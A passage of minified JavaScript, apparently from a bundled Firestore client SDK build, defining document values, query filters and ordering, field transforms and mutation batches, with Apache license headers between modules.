 */class dt{constructor(e){this.value=e}static empty(){return new dt({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let n=this.value;for(let r=0;r<e.length-1;++r)if(n=(n.mapValue.fields||{})[e.get(r)],!Ua(n))return null;return n=(n.mapValue.fields||{})[e.lastSegment()],n||null}}set(e,n){this.getFieldsMap(e.popLast())[e.lastSegment()]=Ms(n)}setAll(e){let n=je.emptyPath(),r={},i=[];e.forEach((o,l)=>{if(!n.isImmediateParentOf(l)){const u=this.getFieldsMap(n);this.applyChanges(u,r,i),r={},i=[],n=l.popLast()}o?r[l.lastSegment()]=Ms(o):i.push(l.lastSegment())});const s=this.getFieldsMap(n);this.applyChanges(s,r,i)}delete(e){const n=this.field(e.popLast());Ua(n)&&n.mapValue.fields&&delete n.mapValue.fields[e.lastSegment()]}isEqual(e){return tn(this.value,e.value)}getFieldsMap(e){let n=this.value;n.mapValue.fields||(n.mapValue={fields:{}});for(let r=0;r<e.length;++r){let i=n.mapValue.fields[e.get(r)];Ua(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},n.mapValue.fields[e.get(r)]=i),n=i}return n.mapValue.fields}applyChanges(e,n,r){$r(n,(i,s)=>e[i]=s);for(const i of r)delete e[i]}clone(){return new dt(Ms(this.value))}}function M0(t){const e=[];return $r(t.fields,(n,r)=>{const i=new je([n]);if(Ua(r)){const s=M0(r.mapValue).fields;if(s.length===0)e.push(i);else for(const o of s)e.push(i.child(o))}else e.push(i)}),new Et(e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ze{constructor(e,n,r,i,s,o,l){this.key=e,this.documentType=n,this.version=r,this.readTime=i,this.createTime=s,this.data=o,this.documentState=l}static newInvalidDocument(e){return new Ze(e,0,Z.min(),Z.min(),Z.min(),dt.empty(),0)}static newFoundDocument(e,n,r,i){return new Ze(e,1,n,Z.min(),r,i,0)}static newNoDocument(e,n){return new Ze(e,2,n,Z.min(),Z.min(),dt.empty(),0)}static newUnknownDocument(e,n){return new Ze(e,3,n,Z.min(),Z.min(),dt.empty(),2)}convertToFoundDocument(e,n){return!this.createTime.isEqual(Z.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=n,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=dt.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=dt.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=Z.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Ze&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Ze(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Tl{constructor(e,n){this.position=e,this.inclusive=n}}function Ng(t,e,n){let r=0;for(let i=0;i<t.position.length;i++){const s=e[i],o=t.position[i];if(s.field.isKeyField()?r=K.comparator(K.fromName(o.referenceValue),n.key):r=Vi(o,n.data.field(s.field)),s.dir==="desc"&&(r*=-1),r!==0)break}return r}function Dg(t,e){if(t===null)return e===null;if(e===null||t.inclusive!==e.inclusive||t.position.length!==e.position.length)return!1;for(let n=0;n<t.position.length;n++)if(!tn(t.position[n],e.position[n]))return!1;return!0}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Il{constructor(e,n="asc"){this.field=e,this.dir=n}}function Cx(t,e){return t.dir===e.dir&&t.field.isEqual(e.field)}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class F0{}class Pe extends F0{constructor(e,n,r){super(),this.field=e,this.op=n,this.value=r}static create(e,n,r){return e.isKeyField()?n==="in"||n==="not-in"?this.createKeyFieldInFilter(e,n,r):new xx(e,n,r):n==="array-contains"?new Nx(e,r):n==="in"?new Dx(e,r):n==="not-in"?new bx(e,r):n==="array-contains-any"?new Vx(e,r):new Pe(e,n,r)}static createKeyFieldInFilter(e,n,r){return n==="in"?new kx(e,r):new Px(e,r)}matches(e){const n=e.data.field(this.field);return this.op==="!="?n!==null&&this.matchesComparison(Vi(n,this.value)):n!==null&&Ur(this.value)===Ur(n)&&this.matchesComparison(Vi(n,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return X()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class Wt extends F0{constructor(e,n){super(),this.filters=e,this.op=n,this.ae=null}static create(e,n){return new Wt(e,n)}matches(e){return U0(this)?this.filters.find(n=>!n.matches(e))===void 0:this.filters.find(n=>n.matches(e))!==void 0}getFlattenedFilters(){return this.ae!==null||(this.ae=this.filters.reduce((e,n)=>e.concat(n.getFlattenedFilters()),[])),this.ae}getFilters(){return Object.assign([],this.filters)}}function U0(t){return t.op==="and"}function j0(t){return Rx(t)&&U0(t)}function Rx(t){for(const e of t.filters)if(e instanceof Wt)return!1;return!0}function Rh(t){if(t instanceof Pe)return t.field.canonicalString()+t.op.toString()+Oi(t.value);if(j0(t))return t.filters.map(e=>Rh(e)).join(",");{const e=t.filters.map(n=>Rh(n)).join(",");return`${t.op}(${e})`}}function z0(t,e){return t instanceof Pe?function(r,i){return i instanceof Pe&&r.op===i.op&&r.field.isEqual(i.field)&&tn(r.value,i.value)}(t,e):t instanceof Wt?function(r,i){return i instanceof Wt&&r.op===i.op&&r.filters.length===i.filters.length?r.filters.reduce((s,o,l)=>s&&z0(o,i.filters[l]),!0):!1}(t,e):void X()}function B0(t){return t instanceof Pe?function(n){return`${n.field.canonicalString()} ${n.op} ${Oi(n.value)}`}(t):t instanceof Wt?function(n){return n.op.toString()+" {"+n.getFilters().map(B0).join(" ,")+"}"}(t):"Filter"}class xx extends Pe{constructor(e,n,r){super(e,n,r),this.key=K.fromName(r.referenceValue)}matches(e){const n=K.comparator(e.key,this.key);return this.matchesComparison(n)}}class kx extends Pe{constructor(e,n){super(e,"in",n),this.keys=$0("in",n)}matches(e){return this.keys.some(n=>n.isEqual(e.key))}}class Px extends Pe{constructor(e,n){super(e,"not-in",n),this.keys=$0("not-in",n)}matches(e){return!this.keys.some(n=>n.isEqual(e.key))}}function $0(t,e){var n;return(((n=e.arrayValue)===null||n===void 0?void 0:n.values)||[]).map(r=>K.fromName(r.referenceValue))}class Nx extends Pe{constructor(e,n){super(e,"array-contains",n)}matches(e){const n=e.data.field(this.field);return tf(n)&&ho(n.arrayValue,this.value)}}class Dx extends Pe{constructor(e,n){super(e,"in",n)}matches(e){const n=e.data.field(this.field);return n!==null&&ho(this.value.arrayValue,n)}}class bx extends Pe{constructor(e,n){super(e,"not-in",n)}matches(e){if(ho(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const n=e.data.field(this.field);return n!==null&&!ho(this.value.arrayValue,n)}}class Vx extends Pe{constructor(e,n){super(e,"array-contains-any",n)}matches(e){const n=e.data.field(this.field);return!(!tf(n)||!n.arrayValue.values)&&n.arrayValue.values.some(r=>ho(this.value.arrayValue,r))}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ox{constructor(e,n=null,r=[],i=[],s=null,o=null,l=null){this.path=e,this.collectionGroup=n,this.orderBy=r,this.filters=i,this.limit=s,this.startAt=o,this.endAt=l,this.ue=null}}function bg(t,e=null,n=[],r=[],i=null,s=null,o=null){return new Ox(t,e,n,r,i,s,o)}function nf(t){const e=ee(t);if(e.ue===null){let n=e.path.canonicalString();e.collectionGroup!==null&&(n+="|cg:"+e.collectionGroup),n+="|f:",n+=e.filters.map(r=>Rh(r)).join(","),n+="|ob:",n+=e.orderBy.map(r=>function(s){return s.field.canonicalString()+s.dir}(r)).join(","),Yl(e.limit)||(n+="|l:",n+=e.limit),e.startAt&&(n+="|lb:",n+=e.startAt.inclusive?"b:":"a:",n+=e.startAt.position.map(r=>Oi(r)).join(",")),e.endAt&&(n+="|ub:",n+=e.endAt.inclusive?"a:":"b:",n+=e.endAt.position.map(r=>Oi(r)).join(",")),e.ue=n}return e.ue}function rf(t,e){if(t.limit!==e.limit||t.orderBy.length!==e.orderBy.length)return!1;for(let n=0;n<t.orderBy.length;n++)if(!Cx(t.orderBy[n],e.orderBy[n]))return!1;if(t.filters.length!==e.filters.length)return!1;for(let n=0;n<t.filters.length;n++)if(!z0(t.filters[n],e.filters[n]))return!1;return t.collectionGroup===e.collectionGroup&&!!t.path.isEqual(e.path)&&!!Dg(t.startAt,e.startAt)&&Dg(t.endAt,e.endAt)}function xh(t){return K.isDocumentKey(t.path)&&t.collectionGroup===null&&t.filters.length===0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ko{constructor(e,n=null,r=[],i=[],s=null,o="F",l=null,u=null){this.path=e,this.collectionGroup=n,this.explicitOrderBy=r,this.filters=i,this.limit=s,this.limitType=o,this.startAt=l,this.endAt=u,this.ce=null,this.le=null,this.he=null,this.startAt,this.endAt}}function Lx(t,e,n,r,i,s,o,l){return new ko(t,e,n,r,i,s,o,l)}function sf(t){return new ko(t)}function Vg(t){return t.filters.length===0&&t.limit===null&&t.startAt==null&&t.endAt==null&&(t.explicitOrderBy.length===0||t.explicitOrderBy.length===1&&t.explicitOrderBy[0].field.isKeyField())}function W0(t){return t.collectionGroup!==null}function Fs(t){const e=ee(t);if(e.ce===null){e.ce=[];const n=new Set;for(const s of e.explicitOrderBy)e.ce.push(s),n.add(s.field.canonicalString());const r=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(o){let l=new Be(je.comparator);return o.filters.forEach(u=>{u.getFlattenedFilters().forEach(h=>{h.isInequality()&&(l=l.add(h.field))})}),l})(e).forEach(s=>{n.has(s.canonicalString())||s.isKeyField()||e.ce.push(new Il(s,r))}),n.has(je.keyField().canonicalString())||e.ce.push(new Il(je.keyField(),r))}return e.ce}function Zt(t){const e=ee(t);return e.le||(e.le=Mx(e,Fs(t))),e.le}function Mx(t,e){if(t.limitType==="F")return bg(t.path,t.collectionGroup,e,t.filters,t.limit,t.startAt,t.endAt);{e=e.map(i=>{const s=i.dir==="desc"?"asc":"desc";return new Il(i.field,s)});const n=t.endAt?new Tl(t.endAt.position,t.endAt.inclusive):null,r=t.startAt?new Tl(t.startAt.position,t.startAt.inclusive):null;return bg(t.path,t.collectionGroup,e,t.filters,t.limit,n,r)}}function kh(t,e){const n=t.filters.concat([e]);return new ko(t.path,t.collectionGroup,t.explicitOrderBy.slice(),n,t.limit,t.limitType,t.startAt,t.endAt)}function Ph(t,e,n){return new ko(t.path,t.collectionGroup,t.explicitOrderBy.slice(),t.filters.slice(),e,n,t.startAt,t.endAt)}function Xl(t,e){return rf(Zt(t),Zt(e))&&t.limitType===e.limitType}function q0(t){return`${nf(Zt(t))}|lt:${t.limitType}`}function Xr(t){return`Query(target=${function(n){let r=n.path.canonicalString();return n.collectionGroup!==null&&(r+=" collectionGroup="+n.collectionGroup),n.filters.length>0&&(r+=`, filters: [${n.filters.map(i=>B0(i)).join(", ")}]`),Yl(n.limit)||(r+=", limit: "+n.limit),n.orderBy.length>0&&(r+=`, orderBy: [${n.orderBy.map(i=>function(o){return`${o.field.canonicalString()} (${o.dir})`}(i)).join(", ")}]`),n.startAt&&(r+=", startAt: ",r+=n.startAt.inclusive?"b:":"a:",r+=n.startAt.position.map(i=>Oi(i)).join(",")),n.endAt&&(r+=", endAt: ",r+=n.endAt.inclusive?"a:":"b:",r+=n.endAt.position.map(i=>Oi(i)).join(",")),`Target(${r})`}(Zt(t))}; limitType=${t.limitType})`}function Jl(t,e){return e.isFoundDocument()&&function(r,i){const s=i.key.path;return r.collectionGroup!==null?i.key.hasCollectionId(r.collectionGroup)&&r.path.isPrefixOf(s):K.isDocumentKey(r.path)?r.path.isEqual(s):r.path.isImmediateParentOf(s)}(t,e)&&function(r,i){for(const s of Fs(r))if(!s.field.isKeyField()&&i.data.field(s.field)===null)return!1;return!0}(t,e)&&function(r,i){for(const s of r.filters)if(!s.matches(i))return!1;return!0}(t,e)&&function(r,i){return!(r.startAt&&!function(o,l,u){const h=Ng(o,l,u);return o.inclusive?h<=0:h<0}(r.startAt,Fs(r),i)||r.endAt&&!function(o,l,u){const h=Ng(o,l,u);return o.inclusive?h>=0:h>0}(r.endAt,Fs(r),i))}(t,e)}function Fx(t){return t.collectionGroup||(t.path.length%2==1?t.path.lastSegment():t.path.get(t.path.length-2))}function H0(t){return(e,n)=>{let r=!1;for(const i of Fs(t)){const s=Ux(i,e,n);if(s!==0)return s;r=r||i.field.isKeyField()}return 0}}function Ux(t,e,n){const r=t.field.isKeyField()?K.comparator(e.key,n.key):function(s,o,l){const u=o.data.field(s),h=l.data.field(s);return u!==null&&h!==null?Vi(u,h):X()}(t.field,e,n);switch(t.dir){case"asc":return r;case"desc":return-1*r;default:return X()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hi{constructor(e,n){this.mapKeyFn=e,this.equalsFn=n,this.inner={},this.innerSize=0}get(e){const n=this.mapKeyFn(e),r=this.inner[n];if(r!==void 0){for(const[i,s]of r)if(this.equalsFn(i,e))return s}}has(e){return this.get(e)!==void 0}set(e,n){const r=this.mapKeyFn(e),i=this.inner[r];if(i===void 0)return this.inner[r]=[[e,n]],void this.innerSize++;for(let s=0;s<i.length;s++)if(this.equalsFn(i[s][0],e))return void(i[s]=[e,n]);i.push([e,n]),this.innerSize++}delete(e){const n=this.mapKeyFn(e),r=this.inner[n];if(r===void 0)return!1;for(let i=0;i<r.length;i++)if(this.equalsFn(r[i][0],e))return r.length===1?delete this.inner[n]:r.splice(i,1),this.innerSize--,!0;return!1}forEach(e){$r(this.inner,(n,r)=>{for(const[i,s]of r)e(i,s)})}isEmpty(){return O0(this.inner)}size(){return this.innerSize}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const jx=new Ie(K.comparator);function Cn(){return jx}const G0=new Ie(K.comparator);function Is(...t){let e=G0;for(const n of t)e=e.insert(n.key,n);return e}function K0(t){let e=G0;return t.forEach((n,r)=>e=e.insert(n,r.overlayedDocument)),e}function Sr(){return Us()}function Q0(){return Us()}function Us(){return new Hi(t=>t.toString(),(t,e)=>t.isEqual(e))}const zx=new Ie(K.comparator),Bx=new Be(K.comparator);function ne(...t){let e=Bx;for(const n of t)e=e.add(n);return e}const $x=new Be(le);function Wx(){return $x}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function of(t,e){if(t.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:El(e)?"-0":e}}function Y0(t){return{integerValue:""+t}}function qx(t,e){return Ex(e)?Y0(e):of(t,e)}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Zl{constructor(){this._=void 0}}function Hx(t,e,n){return t instanceof Sl?function(i,s){const o={fields:{__type__:{stringValue:"server_timestamp"},__local_write_time__:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return s&&Zd(s)&&(s=ef(s)),s&&(o.fields.__previous_value__=s),{mapValue:o}}(n,e):t instanceof fo?J0(t,e):t instanceof po?Z0(t,e):function(i,s){const o=X0(i,s),l=Og(o)+Og(i.Pe);return Ch(o)&&Ch(i.Pe)?Y0(l):of(i.serializer,l)}(t,e)}function Gx(t,e,n){return t instanceof fo?J0(t,e):t instanceof po?Z0(t,e):n}function X0(t,e){return t instanceof Al?function(r){return Ch(r)||function(s){return!!s&&"doubleValue"in s}(r)}(e)?e:{integerValue:0}:null}class Sl extends Zl{}class fo extends Zl{constructor(e){super(),this.elements=e}}function J0(t,e){const n=ew(e);for(const r of t.elements)n.some(i=>tn(i,r))||n.push(r);return{arrayValue:{values:n}}}class po extends Zl{constructor(e){super(),this.elements=e}}function Z0(t,e){let n=ew(e);for(const r of t.elements)n=n.filter(i=>!tn(i,r));return{arrayValue:{values:n}}}class Al extends Zl{constructor(e,n){super(),this.serializer=e,this.Pe=n}}function Og(t){return Ce(t.integerValue||t.doubleValue)}function ew(t){return tf(t)&&t.arrayValue.values?t.arrayValue.values.slice():[]}function Kx(t,e){return t.field.isEqual(e.field)&&function(r,i){return r instanceof fo&&i instanceof fo||r instanceof po&&i instanceof po?bi(r.elements,i.elements,tn):r instanceof Al&&i instanceof Al?tn(r.Pe,i.Pe):r instanceof Sl&&i instanceof Sl}(t.transform,e.transform)}class Qx{constructor(e,n){this.version=e,this.transformResults=n}}class Nt{constructor(e,n){this.updateTime=e,this.exists=n}static none(){return new Nt}static exists(e){return new Nt(void 0,e)}static updateTime(e){return new Nt(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function ja(t,e){return t.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(t.updateTime):t.exists===void 0||t.exists===e.isFoundDocument()}class eu{}function tw(t,e){if(!t.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return t.isNoDocument()?new af(t.key,Nt.none()):new Po(t.key,t.data,Nt.none());{const n=t.data,r=dt.empty();let i=new Be(je.comparator);for(let s of e.fields)if(!i.has(s)){let o=n.field(s);o===null&&s.length>1&&(s=s.popLast(),o=n.field(s)),o===null?r.delete(s):r.set(s,o),i=i.add(s)}return new fr(t.key,r,new Et(i.toArray()),Nt.none())}}function Yx(t,e,n){t instanceof Po?function(i,s,o){const l=i.value.clone(),u=Mg(i.fieldTransforms,s,o.transformResults);l.setAll(u),s.convertToFoundDocument(o.version,l).setHasCommittedMutations()}(t,e,n):t instanceof fr?function(i,s,o){if(!ja(i.precondition,s))return void s.convertToUnknownDocument(o.version);const l=Mg(i.fieldTransforms,s,o.transformResults),u=s.data;u.setAll(nw(i)),u.setAll(l),s.convertToFoundDocument(o.version,u).setHasCommittedMutations()}(t,e,n):function(i,s,o){s.convertToNoDocument(o.version).setHasCommittedMutations()}(0,e,n)}function js(t,e,n,r){return t instanceof Po?function(s,o,l,u){if(!ja(s.precondition,o))return l;const h=s.value.clone(),f=Fg(s.fieldTransforms,u,o);return h.setAll(f),o.convertToFoundDocument(o.version,h).setHasLocalMutations(),null}(t,e,n,r):t instanceof fr?function(s,o,l,u){if(!ja(s.precondition,o))return l;const h=Fg(s.fieldTransforms,u,o),f=o.data;return f.setAll(nw(s)),f.setAll(h),o.convertToFoundDocument(o.version,f).setHasLocalMutations(),l===null?null:l.unionWith(s.fieldMask.fields).unionWith(s.fieldTransforms.map(p=>p.field))}(t,e,n,r):function(s,o,l){return ja(s.precondition,o)?(o.convertToNoDocument(o.version).setHasLocalMutations(),null):l}(t,e,n)}function Xx(t,e){let n=null;for(const r of t.fieldTransforms){const i=e.data.field(r.field),s=X0(r.transform,i||null);s!=null&&(n===null&&(n=dt.empty()),n.set(r.field,s))}return n||null}function Lg(t,e){return t.type===e.type&&!!t.key.isEqual(e.key)&&!!t.precondition.isEqual(e.precondition)&&!!function(r,i){return r===void 0&&i===void 0||!(!r||!i)&&bi(r,i,(s,o)=>Kx(s,o))}(t.fieldTransforms,e.fieldTransforms)&&(t.type===0?t.value.isEqual(e.value):t.type!==1||t.data.isEqual(e.data)&&t.fieldMask.isEqual(e.fieldMask))}class Po extends eu{constructor(e,n,r,i=[]){super(),this.key=e,this.value=n,this.precondition=r,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}}class fr extends eu{constructor(e,n,r,i,s=[]){super(),this.key=e,this.data=n,this.fieldMask=r,this.precondition=i,this.fieldTransforms=s,this.type=1}getFieldMask(){return this.fieldMask}}function nw(t){const e=new Map;return t.fieldMask.fields.forEach(n=>{if(!n.isEmpty()){const r=t.data.field(n);e.set(n,r)}}),e}function Mg(t,e,n){const r=new Map;ce(t.length===n.length);for(let i=0;i<n.length;i++){const s=t[i],o=s.transform,l=e.data.field(s.field);r.set(s.field,Gx(o,l,n[i]))}return r}function Fg(t,e,n){const r=new Map;for(const i of t){const s=i.transform,o=n.data.field(i.field);r.set(i.field,Hx(s,o,e))}return r}class af extends eu{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class Jx extends eu{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Zx{constructor(e,n,r,i){this.batchId=e,this.localWriteTime=n,this.baseMutations=r,this.mutations=i}applyToRemoteDocument(e,n){const r=n.mutationResults;for(let i=0;i<this.mutations.length;i++){const s=this.mutations[i];s.key.isEqual(e.key)&&Yx(s,e,r[i])}}applyToLocalView(e,n){for(const r of this.baseMutations)r.key.isEqual(e.key)&&(n=js(r,e,n,this.localWriteTime));for(const r of this.mutations)r.key.isEqual(e.key)&&(n=js(r,e,n,this.localWriteTime));return n}applyToLocalDocumentSet(e,n){const r=Q0();return this.mutations.forEach(i=>{const s=e.get(i.key),o=s.overlayedDocument;let l=this.applyToLocalView(o,s.mutatedFields);l=n.has(i.key)?null:l;const u=tw(o,l);u!==null&&r.set(i.key,u),o.isValidDocument()||o.convertToNoDocument(Z.min())}),r}keys(){return this.mutations.reduce((e,n)=>e.add(n.key),ne())}isEqual(e){return this.batchId===e.batchId&&bi(this.mutations,e.mutations,(n,r)=>Lg(n,r))&&bi(this.baseMutations,e.baseMutations,(n,r)=>Lg(n,r))}}class lf{constructor(e,n,r,i){this.batch=e,this.commitVersion=n,this.mutationResults=r,this.docVersions=i}static from(e,n,r){ce(e.mutations.length===r.length);let i=function(){return zx}();const s=e.mutations;for(let o=0;o<s.length;o++)i=i.insert(s[o].key,r[o].version);return new lf(e,n,r,i)}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ek{constructor(e,n){this.largestBatchId=e,this.mutation=n}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tk{constructor(e,n){this.count=e,this.unchangedNames=n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
